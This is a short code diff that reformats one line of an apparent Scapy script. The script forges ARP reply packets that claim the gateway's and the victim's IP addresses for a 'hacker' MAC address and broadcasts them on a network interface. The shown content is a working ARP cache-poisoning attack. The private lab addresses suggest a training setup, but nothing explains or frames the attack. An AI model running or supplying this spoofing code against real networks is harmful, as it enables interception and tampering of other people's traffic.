@@ -21,7 +21,9 @@ GATEWAY_IPADDR = '192.168.56.1'
 VICTIM_IPADDR  = '192.168.56.101'
 HACKER_MACADDR = '08:00:27:0c:c1:12'
 
-arp_pkts = Ether(dst='00:00:00:00:00:00')/ARP(op = 2, psrc = [GATEWAY_IPADDR, VICTIM_IPADDR], pdst = '0.0.0.0', hwsrc = HACKER_MACADDR)
+arp_pkts = Ether(dst='00:00:00:00:00:00')/\
+           ARP(op = 2, psrc = [GATEWAY_IPADDR, VICTIM_IPADDR], \
+               pdst = '0.0.0.0', hwsrc = HACKER_MACADDR)
 
 sendp(arp_pkts, iface='p7p1')
 
